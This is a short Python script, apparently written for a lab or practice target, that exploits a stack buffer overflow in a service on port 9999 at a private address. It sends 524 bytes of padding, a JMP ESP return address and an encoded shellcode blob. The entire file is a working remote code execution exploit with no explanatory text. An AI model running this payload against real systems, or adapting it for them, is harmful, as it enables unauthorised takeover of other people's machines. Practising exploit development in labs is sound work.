#!/usr/bin/python3
from pwn import remote, p32

offset = 524
junk = b"A" * offset

jmpesp = p32(0x311712f3)

shellcode =  b""
shellcode += b"\xfc\xbb\xcf\xf0\x92\x67\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\xfe\x2b\x65\x84\x53\x8f\xd9\x21"
shellcode += b"\x51\x86\x3f\x05\x33\x55\x3f\xf5\xe2\xd5\x7f"
shellcode += b"\x37\x94\x5f\xf9\x3e\xfc\x9f\x51\xa4\xa9\x77"
shellcode += b"\xa0\x25\x50\x33\x2d\xc4\xe2\x25\x7e\x56\x51"
shellcode += b"\x19\x7d\xd1\xb4\x90\x02\xb3\x5e\x45\x2c\x47"
shellcode += b"\xf6\xf1\x1d\x88\x64\x6b\xeb\x35\x3a\x38\x62"
shellcode += b"\x58\x0a\xb5\xb9\x1b\x6a\xca\x41\x1c"

shell = remote("192.168.100.62", 9999)

payload = junk + jmpesp + shellcode

shell.sendline(payload)
shell.close()
